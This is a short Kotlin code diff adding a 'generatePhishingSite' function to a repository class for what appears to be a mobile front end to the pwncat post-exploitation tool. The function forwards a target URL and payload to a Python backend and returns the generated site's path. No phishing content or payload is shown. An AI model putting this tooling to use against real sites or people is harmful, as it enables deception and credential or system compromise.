@@ -155,4 +155,14 @@ class PwncatRepository {
         sessionManager.callAttr("run_script", sessionId, name)
         emit(Unit)
     }.flowOn(Dispatchers.IO)
+
+    fun generatePhishingSite(targetUrl: String, payload: String): Flow<String> = flow {
+        val result = sessionManager.callAttr("generate_phishing_site", targetUrl, payload).asMap()
+        val error = result[PyObject.fromJava("error")]
+        if (error != null) {
+            throw Exception(error.toString())
+        } else {
+            emit(result[PyObject.fromJava("path")].toString())
+        }
+    }.flowOn(Dispatchers.IO)
 }
